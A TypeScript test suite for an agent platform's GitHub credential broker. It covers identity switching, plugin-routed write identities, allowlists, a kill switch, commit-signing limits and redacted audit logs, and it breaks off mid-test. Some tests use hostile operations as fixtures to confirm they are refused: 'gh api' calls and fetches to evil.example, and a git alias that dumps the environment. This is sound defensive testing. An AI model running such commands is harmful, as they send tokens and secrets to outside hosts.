import { createNativeGitHubAccess } from "../services/native-runtime/native-github-access.js";
import express from "express";
import request from "supertest";
import { runtimeConnectionIntentRoutes } from "../routes/connection-intents.js";
import { createRuntimeToolsToken } from "../runtime-tools-token.js";
import { errorHandler } from "../middleware/index.js";
import { randomUUID } from "node:crypto";
import { eq } from "drizzle-orm";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import {
  agents,
  companies,
  companyMemberships,
  companySecrets,
  connectionGrants,
  createDb,
  heartbeatRuns,
  issueComments,
  issues,
  plugins,
  pluginState,
  projects,
  activityLog,
  runIdentityContexts,
  toolApplications,
  toolConnectionInstalls,
  toolConnections,
  userSecretDefinitions,
} from "@paperclipai/db";
import { LOW_TRUST_REVIEW_PRESET } from "@paperclipai/shared";
import {
  getEmbeddedPostgresTestSupport,
  startEmbeddedPostgresTestDatabase,
} from "./helpers/embedded-postgres.js";
import {
  initializeRunIdentity,
  reserveSteeredIdentity,
  acceptSteeredIdentity,
} from "../services/run-identity.js";
import { resolveGitHubCommitSignature, resolveGitHubOperationCredentials } from "../services/github-operation-credentials.js";
import { loadGitHubIdentityPolicy, registerGitHubWriteIdentityWorkers } from "../services/github-write-identity.js";
import { agentActionAuditService } from "../services/agent-action-audit.js";
import {
  filterResolvedGitHubConnectionsForRun,
  resolveManagedGitHubIdentitySelection,
} from "../services/git-credentials.js";

const vault = vi.hoisted(() => ({
  resolveUserSecretValue: vi.fn(
    async (_company: string, input: { responsibleUserId: string }) => ({
      value: `test-token-${input.responsibleUserId}`,
    }),
  ),
  resolveSecretValue: vi.fn(async () => "test-dedicated-token"),
}));
vi.mock("../services/secrets.js", () => ({ secretService: () => vault }));
const support = await getEmbeddedPostgresTestSupport();
(support.supported ? describe : describe.skip)(
  "operation-time GitHub credential resolution",
  () => {
    let database: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>>,
      db: ReturnType<typeof createDb>;
    beforeAll(async () => {
      vi.stubEnv(
        "PAPERCLIP_AGENT_JWT_SECRET",
        "test-github-broker-signing-secret",
      );
      database = await startEmbeddedPostgresTestDatabase(
        "paperclip-github-operation-",
      );
      db = createDb(database.connectionString);
    }, 30_000);
    afterAll(async () => {
      await database?.cleanup();
      vi.unstubAllEnvs();
    }, 60_000);
    async function seed() {
      const companyId = randomUUID(),
        agentId = randomUUID(),
        runId = randomUUID(),
        issueId = randomUUID();
      await db.insert(companies).values({
        id: companyId,
        name: companyId,
        issuePrefix: companyId.slice(0, 8),
      });
      await db.insert(agents).values({
        id: agentId,
        companyId,
        name: "Shared",
        role: "engineer",
        adapterType: "codex_local",
      });
      await db
        .insert(issues)
        .values({ id: issueId, companyId, title: "Identity test" });
      await db.insert(heartbeatRuns).values({
        id: runId,
        companyId,
        agentId,
        status: "running",
        contextSnapshot: { issueId },
      });
      await db.insert(companyMemberships).values(
        ["A", "B"].map((principalId) => ({
          companyId,
          principalType: "user",
          principalId,
          status: "active",
          membershipRole: "member",
        })),
      );
      await initializeRunIdentity(db, {
        companyId,
        runId,
        responsibleUserId: "A",
        cause: "instruction",
      });
      return { companyId, agentId, runId, issueId };
    }
    async function grant(
      input: Awaited<ReturnType<typeof seed>>,
      user: string,
      dedicated = false,
    ) {
      const applicationId = randomUUID(),
        connectionId = randomUUID(),
        secretId = randomUUID(),
        definitionId = randomUUID(),
        id = randomUUID();
      await db.insert(toolApplications).values({
        id: applicationId,
        companyId: input.companyId,
        name: applicationId,
        type: "mcp_http",
      });
      await db.insert(toolConnections).values({
        id: connectionId,
        companyId: input.companyId,
        applicationId,
        name: connectionId,
        uid: connectionId,
        transport: "mcp_remote",
        status: "active",
        enabled: true,
        credentialPolicy: dedicated ? "per_agent" : "per_user",
        config: { sourceTemplateKey: "github" },
      });
      await db.insert(toolConnectionInstalls).values({
        companyId: input.companyId,
        connectionId,
        targetType: "agent",
        targetId: input.agentId,
      });
      if (!dedicated)
        await db.insert(userSecretDefinitions).values({
          id: definitionId,
          companyId: input.companyId,
          key: definitionId,
          name: "Test GitHub",
        });
      await db.insert(companySecrets).values({
        id: secretId,
        companyId: input.companyId,
        key: secretId,
        name: `Test token ${secretId}`,
        scope: dedicated ? "company" : "user",
        ownerUserId: dedicated ? null : user,
        userSecretDefinitionId: dedicated ? null : definitionId,
      });
      await db.insert(connectionGrants).values({
        id,
        companyId: input.companyId,
        connectionId,
        kind: dedicated ? "agent" : "user",
        subjectUserId: dedicated ? null : user,
        subjectAgentId: dedicated ? input.agentId : null,
        status: "active",
        credentialSecretRefs: [
          {
            secretId,
            configPath: "oauth.access_token",
            versionSelector: "latest",
          },
        ],
        providerTenant: {
          github: {
            userId: user,
            login: user,
            installationCount: 1,
            repositoryCount: 1,
            repositorySelection: "selected",
            installationIds: ["1"],
            installationOwnerLogins: [user],
          },
        },
      });
      return { id, connectionId, secretId, definitionId };
    }
    async function switchTo(
      input: Awaited<ReturnType<typeof seed>>,
      user: string,
    ) {
      const id = randomUUID();
      await db.insert(issueComments).values({
        id,
        companyId: input.companyId,
        issueId: input.issueId,
        authorUserId: user,
        body: "Next instruction",
      });
      const context = await reserveSteeredIdentity(db, {
        ...input,
        messageId: id,
      });
      await acceptSteeredIdentity(db, context!);
    }
    it("resolves A → B → A without retaining tokens, and records only redacted diagnostics", async () => {
      const input = await seed();
      await grant(input, "A");
      await grant(input, "B");
      for (const user of ["A", "B", "A"]) {
        await switchTo(input, user);
        const result = await resolveGitHubOperationCredentials(db, input);
        expect(result).toMatchObject({
          status: "available",
          login: user,
          source: "personal",
          attribution: { agentName: "Shared", runId: input.runId },
        });
        expect(result.env.GH_TOKEN).toBe(`test-token-${user}`);
        expect(result.env.GIT_AUTHOR_EMAIL).toBe(
          `${user}+${user}@users.noreply.github.com`,
        );
      }
      const history = await db
        .select()
        .from(runIdentityContexts)
        .where(eq(runIdentityContexts.runId, input.runId));
      expect(JSON.stringify(history)).not.toContain("test-token-");
    });
    // A GitHub plugin that declares the write identity, with the company's saved policy in its state.
    async function identityPlugin(input: Awaited<ReturnType<typeof seed>>, policy: Record<string, unknown>, status = "ready") {
      const pluginId = randomUUID();
      await db.insert(plugins).values({
        id: pluginId,
        pluginKey: `github-${pluginId}`,
        packageName: "github",
        version: "1.0.0",
        status: status as never,
        manifestJson: {
          id: `github-${pluginId}`, apiVersion: 1, version: "1.0.0", displayName: "GitHub", description: "", author: "", categories: ["connector"],
          capabilities: ["ui.action.register"], entrypoints: { worker: "./worker.js" },
          projectRepositories: { listAction: "list", writeIdentityAction: "repository-write-identity", signCommitAction: "repository-sign-commit" },
        } as never,
      });
      await db.insert(pluginState).values({ pluginId, scopeKind: "company", scopeId: input.companyId, namespace: "identity", stateKey: "write-identity", valueJson: policy });
      const calls: Array<{ key: string; params: Record<string, unknown> }> = [];
      const plugin = {
        pluginId, calls,
        answer: (_key: string, _params: Record<string, unknown>): unknown => ({ identity: "user", missingUserConnection: "fail" }),
      };
      registerGitHubWriteIdentityWorkers({
        call: (async (id: string, method: string, request: { key: string; params: Record<string, unknown>; actorContext: { type: string } }) => {
          expect([id, method, request.actorContext.type]).toEqual([pluginId, "performAction", "system"]);
          calls.push({ key: request.key, params: request.params });
          return plugin.answer(request.key, request.params);
        }) as never,
      });
      return plugin;
    }
    const userWrites = { commit: "user", push: "user", pullRequest: "user", comment: "user" };
    const anthmPolicy = {
      default: userWrites, userSource: "app", allowedRepositories: ["Anthm-FR/songtrivia"], userLogin: "agent-owner",
      installationPermissions: { contents: "write", metadata: "read" },
    };
    it("lets the GitHub plugin's write identity route each write to its App or the run's user", async () => {
      const input = await seed();
      await grant(input, "A");
      const plugin = await identityPlugin(input, { default: userWrites });
      const bot = { identity: "bot", credential: { token: "app-token", login: "vllnt-agents[bot]", userId: "99" } };
      const push = { program: "git" as const, args: ["push", "origin", "HEAD"], remote: "git@github.com:vllnt/paperclip.git", currentBranch: "feat", touchesWorkflows: false };
      try {
        // Reads never ask the plugin and keep the run's user.
        const read = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["fetch"], remote: null });
        expect(read).toMatchObject({ status: "available", login: "A" });
        expect(plugin.calls).toEqual([]);

        plugin.answer = () => bot;
        const asBot = await resolveGitHubOperationCredentials(db, input, push);
        expect(plugin.calls).toEqual([{ key: "repository-write-identity", params: {
          companyId: input.companyId, repository: "vllnt/paperclip", access: "write", action: "push", privileged: [], wiki: false, pullRequest: null, expectedHeadSha: null,
        } }]);
        expect(asBot).toMatchObject({ status: "available", writeIdentity: "bot", login: "vllnt-agents[bot]" });
        expect(asBot.env).toMatchObject({
          GH_TOKEN: "app-token",
          GIT_AUTHOR_NAME: "vllnt-agents[bot]",
          GIT_AUTHOR_EMAIL: "99+vllnt-agents[bot]@users.noreply.github.com",
        });
        // The run's identity summary still describes its user.
        const [context] = await db.select().from(runIdentityContexts).where(eq(runIdentityContexts.runId, input.runId));
        expect(context!.github).toMatchObject({ login: "A" });

        plugin.answer = () => ({ identity: "user", missingUserConnection: "fail" });
        const asUser = await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["pr", "comment", "1", "-R", "vllnt/site"], remote: null });
        expect(plugin.calls.at(-1)!.params).toMatchObject({ repository: "vllnt/site", action: "comment" });
        expect(asUser).toMatchObject({ status: "available", writeIdentity: "user", login: "A" });
        expect(asUser.env.GH_TOKEN).toBe("test-token-A");

        // Without a user identity, use_bot asks again for the App; fail keeps no credential.
        await switchTo(input, "B");
        plugin.answer = (_key, params) => params.fallback ? bot : { identity: "user", missingUserConnection: "use_bot" };
        const fallback = await resolveGitHubOperationCredentials(db, input, push);
        expect(plugin.calls.at(-1)!.params).toMatchObject({ fallback: true });
        expect(fallback).toMatchObject({ status: "available", writeIdentity: "bot" });
        plugin.answer = () => ({ identity: "user", missingUserConnection: "fail" });
        const missing = await resolveGitHubOperationCredentials(db, input, push);
        expect(missing).toMatchObject({ status: "unavailable", writeIdentity: "user", failClosed: true });
        expect(missing.env).toEqual({});

        // A plugin that cannot answer fails closed rather than using the user.
        await switchTo(input, "A");
        plugin.answer = () => { throw new Error("token leaked in provider error"); };
        const failed = await resolveGitHubOperationCredentials(db, input, push);
        expect(failed).toMatchObject({ status: "unavailable", reason: "GitHub write identity is temporarily unavailable", env: {}, failClosed: true });

        const audit = await db.select().from(activityLog).where(eq(activityLog.runId, input.runId));
        const writes = audit.filter(row => row.action === "github.write_identity_resolved" || row.action === "github.user_identity_write")
          .sort((a, b) => +a.createdAt - +b.createdAt);
        expect(writes.map(row => [row.action, (row.details as { identity: string }).identity])).toEqual([
          ["github.write_identity_resolved", "bot"], ["github.user_identity_write", "user"], ["github.write_identity_resolved", "bot"],
          ["github.write_identity_resolved", "user"], ["github.write_identity_resolved", "bot"],
        ]);
        expect(JSON.stringify(writes)).not.toMatch(/app-token|test-token|leaked/);
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("sends every operation of an App-user company to the plugin and never uses the run's own GitHub", async () => {
      const input = await seed();
      await grant(input, "A");
      await db.update(issues).set({ identifier: `ANT-${input.issueId.slice(0, 4)}` }).where(eq(issues.id, input.issueId));
      const plugin = await identityPlugin(input, anthmPolicy);
      const user = { login: "agent-owner", userId: "32437578" };
      const signingKey = `ssh-ed25519 ${"A".repeat(68)}`;
      plugin.answer = (_key, params) => params.access === "read"
        ? { identity: "bot", credential: { token: "ghs_read", login: "anthm-agents[bot]", userId: "99" }, author: user }
        : params.access === "none"
          ? { identity: "user", credential: { token: null, ...user }, signingKey }
          : params.repository === "anthm-fr/linkzic"
            ? { identity: "user", unavailable: "anthm-fr/linkzic is not in this company's GitHub write allowlist." }
            : { identity: "user", credential: { token: "ghu_user", ...user }, signingKey, bodyFooter: false, evidence: { adminMerge: { headSha: "a".repeat(40), checks: [{ name: "lint", result: "success" }] } } };
      const before = vault.resolveUserSecretValue.mock.calls.length;
      const sha = "b".repeat(40);
      try {
        expect(await loadGitHubIdentityPolicy(db, input.companyId)).toMatchObject({ pluginId: plugin.pluginId, ready: true, policy: { userSource: "app", enabled: true } });
        const read = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["fetch", "origin"], remote: "https://github.com/Anthm-FR/songtrivia.git" });
        expect(read).toMatchObject({ status: "available", writeIdentity: "bot", login: "anthm-agents[bot]" });
        expect(read.env).toMatchObject({ GH_TOKEN: "ghs_read", GIT_AUTHOR_NAME: "agent-owner" });
        expect(read).not.toHaveProperty("attribution");
        // An unreported command (a server-side clone without a remote) is a read too.
        expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({ status: "available", env: { GH_TOKEN: "ghs_read" } });
        expect(plugin.calls.at(-1)!.params).toMatchObject({ access: "read", repository: null });
        // Local commands carry the identity and signing key, never a token.
        const commit = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["commit", "-m", "x"], remote: "https://github.com/Anthm-FR/songtrivia.git" });
        expect(commit).toMatchObject({ status: "available", signingKey, env: { GIT_AUTHOR_NAME: "agent-owner", GIT_COMMITTER_EMAIL: "32437578+agent-owner@users.noreply.github.com" } });
        expect(commit.env).not.toHaveProperty("GH_TOKEN");
        expect(commit.env).not.toHaveProperty("PAPERCLIP_GIT_TOKEN");
        // A write gets the App user's token, and the record names the run, issue, agent, repository and evidence.
        const merge = await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["pr", "merge", "7", "--admin", "--squash", "--match-head-commit", "a".repeat(40)], remote: "https://github.com/Anthm-FR/songtrivia.git" });
        expect(merge).toMatchObject({ status: "available", writeIdentity: "user", login: "agent-owner", signingKey, env: { GH_TOKEN: "ghu_user" } });
        expect(plugin.calls.at(-1)!.params).toMatchObject({ access: "write", action: "pullRequest", privileged: ["adminMerge"], pullRequest: 7, expectedHeadSha: "a".repeat(40) });
        await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["push", "origin", "feat"], remote: "https://github.com/Anthm-FR/songtrivia.git", currentBranch: "feat", touchesWorkflows: false, shas: [sha] });
        // The fence refuses, and nothing falls back to the run's own GitHub.
        const outside = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["push", "origin", "feat"], remote: "https://github.com/Anthm-FR/linkzic.git", currentBranch: "feat", touchesWorkflows: false });
        expect(outside).toMatchObject({ status: "unavailable", failClosed: true, env: {}, reason: expect.stringContaining("allowlist") });
        // Release tags are refused before the plugin is asked.
        const calls = plugin.calls.length;
        const tag = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["push", "origin", "engine@1.4.0"], remote: "https://github.com/Anthm-FR/songtrivia.git", refs: { "engine@1.4.0": "refs/tags/engine@1.4.0" } });
        expect(tag).toMatchObject({ status: "unavailable", failClosed: true, reason: expect.stringContaining("release workflow") });
        expect(plugin.calls).toHaveLength(calls);
        // A plugin that defers, or is not running, fails closed; it never becomes the run's user.
        plugin.answer = () => ({ identity: "user", missingUserConnection: "fail" });
        expect(await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["pr", "create", "-R", "Anthm-FR/songtrivia"], remote: null }))
          .toMatchObject({ status: "unavailable", failClosed: true });
        await db.update(plugins).set({ status: "error" as never }).where(eq(plugins.id, plugin.pluginId));
        // The saved policy still keeps the company in managed GitHub mode (heartbeat), so nothing falls back to a host credential.
        expect(await loadGitHubIdentityPolicy(db, input.companyId)).toMatchObject({ ready: false, policy: { userSource: "app" } });
        expect(await loadGitHubIdentityPolicy(db, randomUUID())).toBeNull();
        expect(await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["pr", "create", "-R", "Anthm-FR/songtrivia"], remote: null }))
          .toMatchObject({ status: "unavailable", failClosed: true });
        expect(await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["fetch"], remote: null })).toMatchObject({ status: "unavailable" });
        expect(vault.resolveUserSecretValue.mock.calls.length).toBe(before);

        const audit = await db.select().from(activityLog).where(eq(activityLog.runId, input.runId));
        const granted = audit.filter(row => row.action === "github.user_identity_write").sort((a, b) => +a.createdAt - +b.createdAt);
        expect(granted.map(row => row.details)).toEqual([
          expect.objectContaining({ runId: input.runId, agentId: input.agentId, issueKey: `ANT-${input.issueId.slice(0, 4)}`, repository: "anthm-fr/songtrivia",
            action: "pullRequest", privileged: ["adminMerge"], pullRequest: 7, headSha: "a".repeat(40), login: "agent-owner",
            evidence: { adminMerge: { headSha: "a".repeat(40), checks: [{ name: "lint", result: "success" }] } } }),
          expect.objectContaining({ action: "push", repository: "anthm-fr/songtrivia", shas: [sha], issueKey: `ANT-${input.issueId.slice(0, 4)}` }),
        ]);
        const refused = audit.filter(row => row.action === "github.write_identity_resolved").map(row => (row.details as { reason?: string }).reason);
        expect(refused).toEqual(expect.arrayContaining([expect.stringContaining("allowlist"), expect.stringContaining("release workflow")]));
        expect(JSON.stringify(audit)).not.toMatch(/ghu_user|ghs_read/);
        // The daily digest: everything done in the person's name in the last 24 hours.
        const digest = await agentActionAuditService(db).list({ companyId: input.companyId, actorScope: "all", action: "github.user_identity_write", from: new Date(Date.now() - 86_400_000), limit: 50 });
        expect(digest.items.filter(item => item.action === "github.user_identity_write")).toHaveLength(2);
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("serves the sign route only to a run capability, never to a browser", async () => {
      const input = await seed();
      const plugin = await identityPlugin(input, anthmPolicy);
      const signature = { signature: "-----BEGIN SSH SIGNATURE-----\nU1NIU0lH\n-----END SSH SIGNATURE-----\n", keyFingerprint: `SHA256:${"b".repeat(43)}` };
      plugin.answer = key => key === "repository-sign-commit" ? signature
        : { identity: "user", credential: { token: null, login: "agent-owner", userId: "32437578" }, signingKey: `ssh-ed25519 ${"A".repeat(68)}` };
      await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["commit", "-m", "x"], remote: null });
      const app = express();
      app.use(express.json());
      app.use(runtimeConnectionIntentRoutes(db));
      app.use(errorHandler);
      const token = createRuntimeToolsToken({ ...input, responsibleUserId: "A", scope: "github_credentials" })!.token;
      const wrongScope = createRuntimeToolsToken({ ...input, responsibleUserId: "A", scope: "connection_intents" })!.token;
      const payload = Buffer.from("tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904\n\nx\n").toString("base64");
      const post = () => request(app).post("/runtime-tools/github/sign");
      try {
        const signed = await post().set("x-paperclip-github-capability", token).send({ payload });
        expect(signed.status).toBe(200);
        expect(signed.headers["cache-control"]).toBe("no-store");
        expect(signed.body).toEqual({ signature: expect.stringMatching(/^-----BEGIN SSH SIGNATURE-----/) });
        expect((await post().set("x-paperclip-github-capability", token).send({})).status).toBe(400);
        expect((await post().set("x-paperclip-github-capability", wrongScope).send({ payload })).status).toBe(401);
        expect((await post().send({ payload })).status).toBe(401);
        for (const [header, value] of [["Origin", "http://127.0.0.1"], ["Cookie", "session=test"], ["Sec-Fetch-Site", "same-origin"]]) {
          expect((await post().set("x-paperclip-github-capability", token).set(header!, value!).send({ payload })).status).toBe(403);
        }
        plugin.answer = () => ({ unavailable: "Paperclip signs only commits and tags whose committer is the App user." });
        const refused = await post().set("x-paperclip-github-capability", token).send({ payload });
        expect(refused.status).toBe(200);
        expect(refused.body.unavailable).toContain("committer");
        // An ended run cannot sign.
        await db.update(heartbeatRuns).set({ status: "succeeded" }).where(eq(heartbeatRuns.id, input.runId));
        expect((await post().set("x-paperclip-github-capability", token).send({ payload })).status).toBe(403);
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("withholds the run's token under the kill switch, refuses unreadable reports and an ambiguous plugin", async () => {
      const input = await seed();
      await grant(input, "A");
      const plugin = await identityPlugin(input, { default: userWrites, enabled: false });
      try {
        // Run mode, kill switch on: no read or write credential at all; local commands keep identity without a token.
        expect(await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["fetch"], remote: "https://github.com/vllnt/paperclip.git" }))
          .toMatchObject({ status: "unavailable", reason: expect.stringContaining("kill switch"), env: {} });
        expect(await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["push", "origin", "feat"], remote: "https://github.com/vllnt/paperclip.git", currentBranch: "feat", touchesWorkflows: false }))
          .toMatchObject({ status: "unavailable", failClosed: true });
        const local = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["status"], remote: null });
        expect(local).toMatchObject({ status: "available", login: "A", env: { GIT_AUTHOR_NAME: "A" } });
        expect(local.env).not.toHaveProperty("GH_TOKEN");
        expect(local.env).not.toHaveProperty("PAPERCLIP_GIT_TOKEN");
        // An unreadable report is a write Paperclip cannot check.
        expect(await resolveGitHubOperationCredentials(db, input, "unreadable")).toMatchObject({ status: "unavailable", failClosed: true, reason: expect.stringContaining("could not read") });
        // A second plugin that also declares the write identity makes the owner ambiguous: nobody is asked.
        const other = randomUUID();
        await db.insert(plugins).values({ id: other, pluginKey: `other-${other}`, packageName: "other", version: "1.0.0", status: "ready",
          manifestJson: { id: `other-${other}`, apiVersion: 1, version: "1.0.0", displayName: "Other", description: "", author: "", categories: ["connector"],
            capabilities: ["ui.action.register"], entrypoints: { worker: "./worker.js" }, projectRepositories: { listAction: "list", writeIdentityAction: "decide" } } as never });
        expect(await loadGitHubIdentityPolicy(db, input.companyId)).toMatchObject({ ambiguous: true, policy: "invalid" });
        const calls = plugin.calls.length;
        expect(await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["fetch"], remote: null })).toMatchObject({ status: "unavailable" });
        expect(plugin.calls).toHaveLength(calls);
        await db.delete(plugins).where(eq(plugins.id, other));
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("signs commits only for standard-trust runs of an App-user company, and records each signature", async () => {
      const input = await seed();
      const plugin = await identityPlugin(input, anthmPolicy);
      const payload = Buffer.from("tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904\ncommitter agent-owner <32437578+agent-owner@users.noreply.github.com> 1 +0000\n\nx\n").toString("base64");
      plugin.answer = key => key === "repository-sign-commit"
        ? { signature: "-----BEGIN SSH SIGNATURE-----\nU1NIU0lH\n-----END SSH SIGNATURE-----\n", keyFingerprint: `SHA256:${"a".repeat(43)}` }
        : { identity: "user", credential: { token: null, login: "agent-owner", userId: "32437578" }, signingKey: `ssh-ed25519 ${"A".repeat(68)}` };
      try {
        await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["commit", "-m", "x"], remote: null });
        plugin.calls.length = 0;
        expect(await resolveGitHubCommitSignature(db, input, payload)).toEqual({ signature: expect.stringMatching(/^-----BEGIN SSH SIGNATURE-----/) });
        expect(plugin.calls).toEqual([{ key: "repository-sign-commit", params: { companyId: input.companyId, payload } }]);
        plugin.answer = () => ({ unavailable: "GitHub writes are switched off for this company (write identity kill switch)." });
        expect(await resolveGitHubCommitSignature(db, input, payload)).toEqual({ unavailable: expect.stringContaining("kill switch") });
        expect(await resolveGitHubCommitSignature(db, input, "not base64!")).toMatchObject({ unavailable: expect.stringContaining("base64") });
        const audit = await db.select().from(activityLog).where(eq(activityLog.runId, input.runId));
        expect(audit.filter(row => row.action === "github.commit_signed").map(row => row.details)).toEqual([expect.objectContaining({
          runId: input.runId, payloadSha256: expect.stringMatching(/^[0-9a-f]{64}$/), keyFingerprint: `SHA256:${"a".repeat(43)}`,
        })]);
        expect(audit.filter(row => row.action === "github.commit_sign_refused")).toHaveLength(1);
        // A low-trust run never reaches the signer.
        const calls = plugin.calls.length;
        await db.update(issues).set({ sourceTrust: { preset: LOW_TRUST_REVIEW_PRESET, disposition: "quarantined", sourceIssueId: input.issueId } }).where(eq(issues.id, input.issueId));
        expect(await resolveGitHubCommitSignature(db, input, payload)).toEqual({ unavailable: expect.stringContaining("low-trust") });
        expect(plugin.calls).toHaveLength(calls);
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("F5: signs only for a run whose own managed git commit, merge, rebase, pull or tag is in progress", async () => {
      const input = await seed();
      const plugin = await identityPlugin(input, anthmPolicy);
      const user = { login: "agent-owner", userId: "32437578" };
      const payload = Buffer.from("tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904\n\nx\n").toString("base64");
      plugin.answer = (key, params) => key === "repository-sign-commit"
        ? { signature: "-----BEGIN SSH SIGNATURE-----\nU1NIU0lH\n-----END SSH SIGNATURE-----\n", keyFingerprint: `SHA256:${"a".repeat(43)}` }
        : params.access === "read"
          ? { identity: "bot", credential: { token: "ghs_read", login: "anthm-agents[bot]", userId: "99" }, author: user }
          : { identity: "user", credential: { token: null, ...user }, signingKey: `ssh-ed25519 ${"A".repeat(68)}` };
      try {
        // A direct call to the signer, with no git commit reported by the run's launcher, is refused before the plugin is asked.
        expect(await resolveGitHubCommitSignature(db, input, payload)).toMatchObject({ unavailable: expect.stringContaining("managed git") });
        // Commands that never create a commit do not open signing either.
        await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["status"], remote: null });
        await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["fetch", "origin"], remote: "https://github.com/Anthm-FR/songtrivia.git" });
        expect(await resolveGitHubCommitSignature(db, input, payload)).toMatchObject({ unavailable: expect.stringContaining("managed git") });
        expect(plugin.calls.filter(call => call.key === "repository-sign-commit")).toEqual([]);
        // Another run's commit does not open signing for this run.
        const other = await seed();
        await db.insert(pluginState).values({ pluginId: plugin.pluginId, scopeKind: "company", scopeId: other.companyId, namespace: "identity", stateKey: "write-identity", valueJson: anthmPolicy });
        await resolveGitHubOperationCredentials(db, other, { program: "git", args: ["commit", "-m", "x"], remote: null });
        expect(await resolveGitHubCommitSignature(db, input, payload)).toMatchObject({ unavailable: expect.stringContaining("managed git") });
        // This run's own commit opens it.
        await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["rebase", "main"], remote: null });
        expect(await resolveGitHubCommitSignature(db, input, payload)).toEqual({ signature: expect.stringMatching(/^-----BEGIN SSH SIGNATURE-----/) });
        const audit = await db.select().from(activityLog).where(eq(activityLog.runId, input.runId));
        expect(audit.filter(row => row.action === "github.commit_sign_refused")).toHaveLength(3);
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("F1/F3: refuses other hosts and unknown git commands before asking the plugin, and they never run", async () => {
      const input = await seed();
      const plugin = await identityPlugin(input, anthmPolicy);
      plugin.answer = (_key, params) => params.access === "read"
        ? { identity: "bot", credential: { token: "ghs_read", login: "anthm-agents[bot]", userId: "99" } }
        : { identity: "user", credential: { token: "ghu_user", login: "agent-owner", userId: "32437578" } };
      const remote = "https://github.com/Anthm-FR/songtrivia.git";
      try {
        for (const operation of [
          { program: "gh" as const, args: ["api", "https://evil.example/collect"], remote },
          { program: "gh" as const, args: ["api", "--hostname", "github.localhost", "user"], remote },
          { program: "gh" as const, args: ["pr", "view", "1", "-R", "tenant.ghe.com/Anthm-FR/songtrivia"], remote },
          { program: "git" as const, args: ["fetch", "origin"], remote: "https://evil.example/Anthm-FR/songtrivia.git" },
          { program: "git" as const, args: ["send-pack", "https://github.com/Anthm-FR/songtrivia", "main"], remote },
        ]) {
          const result = await resolveGitHubOperationCredentials(db, input, operation);
          expect(result, JSON.stringify(operation.args)).toMatchObject({ status: "unavailable", failClosed: true, env: {} });
        }
        expect(plugin.calls).toEqual([]);
        const audit = await db.select().from(activityLog).where(eq(activityLog.runId, input.runId));
        expect(audit.filter(row => row.action === "github.write_identity_resolved")).toHaveLength(5);
        expect(JSON.stringify(audit)).not.toMatch(/ghu_user|ghs_read/);
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("F3: under the run's own identity, git plumbing never receives the run's write token", async () => {
      const input = await seed();
      await grant(input, "A");
      const plugin = await identityPlugin(input, { default: userWrites, allowedRepositories: ["vllnt/paperclip"] });
      try {
        const sendPack = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["send-pack", "https://github.com/vllnt/elsewhere", "main"], remote: "https://github.com/vllnt/paperclip.git" });
        expect(sendPack).toMatchObject({ status: "unavailable", failClosed: true, env: {} });
        expect(sendPack.env).not.toHaveProperty("GH_TOKEN");
        const alias = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["-c", "alias.x=!env", "x"], remote: "https://github.com/vllnt/paperclip.git" });
        expect(alias).toMatchObject({ status: "unavailable", failClosed: true, env: {} });
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("R6 (round 2b): refuses other hosts and unknown git commands for a company without a policy too, and keeps its normal reads", async () => {
      const input = await seed();
      await grant(input, "A");
      const remote = "https://github.com/vllnt/paperclip.git";
      for (const operation of [
        { program: "gh" as const, args: ["api", "--hostname", "tenant.ghe.com", "user"], remote },
        { program: "gh" as const, args: ["pr", "view", "1", "-R", "github.localhost/vllnt/paperclip"], remote },
        { program: "git" as const, args: ["-c", "alias.x=!env", "x"], remote },
        { program: "git" as const, args: ["clone", "--depth", "1", "https://evil.example/x/y"], remote: null },
      ]) {
        const result = await resolveGitHubOperationCredentials(db, input, operation);
        expect(result, JSON.stringify(operation.args)).toMatchObject({ status: "unavailable", failClosed: true, env: {} });
      }
      // Without a policy, ordinary commands keep the run's own identity as before.
      expect(await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["fetch", "origin"], remote })).toMatchObject({ status: "available", login: "A", env: { GH_TOKEN: "test-token-A" } });
    });
    it("R9 (round 2b): a tag does not open commit signing", async () => {
      const input = await seed();
      const plugin = await identityPlugin(input, anthmPolicy);
      plugin.answer = key => key === "repository-sign-commit"
